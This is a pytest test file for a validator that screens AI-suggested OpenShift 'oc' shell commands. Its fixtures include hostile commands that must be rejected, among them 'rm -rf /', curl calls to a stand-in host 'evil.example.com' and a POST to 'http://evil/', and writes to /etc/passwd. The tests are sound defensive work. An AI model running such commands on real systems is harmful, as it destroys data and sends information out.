from __future__ import annotations

import pytest

from ocai.executor import ExecutionRefused, _validate
from ocai.providers.base import Suggestion


def s(command: str, *, destructive: bool = False) -> Suggestion:
    return Suggestion(command=command, explanation="", destructive=destructive)


# --- happy path -------------------------------------------------------------


def test_simple_oc_get():
    _validate(s("oc get pods"))


def test_oc_with_selectors_and_quoting():
    _validate(s("oc get pods -l 'app=foo,env=bar' --all-namespaces"))


def test_oc_pipeline_to_jq_and_wc():
    _validate(s("oc get pods -o json | jq '.items[]' | wc -l"))


def test_oc_pipeline_no_spaces_around_pipe():
    _validate(s("oc get pods -o json|jq '.items[]'"))


# --- injection attempts -----------------------------------------------------


@pytest.mark.parametrize("cmd", [
    "oc get pods; rm -rf /",
    "echo oc && rm -rf ~/",
    "oc get pods || curl evil.example.com",
    "oc get pods &",
])
def test_rejects_command_chaining(cmd):
    with pytest.raises(ExecutionRefused, match="forbidden shell operator"):
        _validate(s(cmd))


@pytest.mark.parametrize("cmd", [
    "oc get pods $(rm -rf /)",
    "oc get pods `id`",
    "oc get pods <(curl evil.example.com)",
    "oc get pods >(tee /etc/passwd)",
])
def test_rejects_command_and_process_substitution(cmd):
    with pytest.raises(ExecutionRefused, match="forbidden shell construct"):
        _validate(s(cmd))


def test_rejects_redirects():
    # `>` is not a chaining operator but we don't need it; the model has no
    # legitimate reason to emit one and allowing it just widens the surface.
    with pytest.raises(ExecutionRefused, match="forbidden shell operator"):
        _validate(s("oc get pods > /etc/passwd"))


def test_rejects_disallowed_pipe_tool():
    with pytest.raises(ExecutionRefused, match="not in the allowlist"):
        _validate(s("oc get pods | curl -X POST http://evil/"))


def test_rejects_command_without_oc():
    # Crucially: previous implementation passed this because 'oc' appeared as
    # a positional argument to echo — `"oc" in tokens` was True.
    with pytest.raises(ExecutionRefused):
        _validate(s("echo oc"))


def test_rejects_oc_only_as_pipeline_arg():
    # Another shape of the same bug: `oc` shows up but only as an argument
    # to a non-oc command.
    with pytest.raises(ExecutionRefused):
        _validate(s("grep oc /tmp/file"))


def test_rejects_empty_command():
    with pytest.raises(ExecutionRefused, match="empty command"):
        _validate(s(""))


def test_rejects_unparseable_command():
    with pytest.raises(ExecutionRefused, match="unparseable command"):
        _validate(s("oc get 'unterminated"))


# --- static destructive detection -------------------------------------------


@pytest.mark.parametrize("cmd", [
    "oc delete pod nginx",
    "oc apply -f manifest.yaml",
    "oc scale deployment frontend --replicas=5",
    "oc rollout restart deployment/orders",
    "oc exec mypod -- whoami",
    "oc adm cordon worker-1",
])
def test_static_check_flags_destructive_even_when_model_said_false(cmd):
    suggestion = s(cmd, destructive=False)
    _validate(suggestion)
    assert suggestion.destructive is True, (
        f"static check failed to flag {cmd!r} as destructive"
    )


def test_static_check_leaves_read_only_alone():
    suggestion = s("oc get pods", destructive=False)
    _validate(suggestion)
    assert suggestion.destructive is False


def test_static_check_does_not_unset_model_flag():
    # Model said destructive=True, static check sees no destructive verb —
    # we keep the model's stricter signal.
    suggestion = s("oc get pods", destructive=True)
    _validate(suggestion)
    assert suggestion.destructive is True
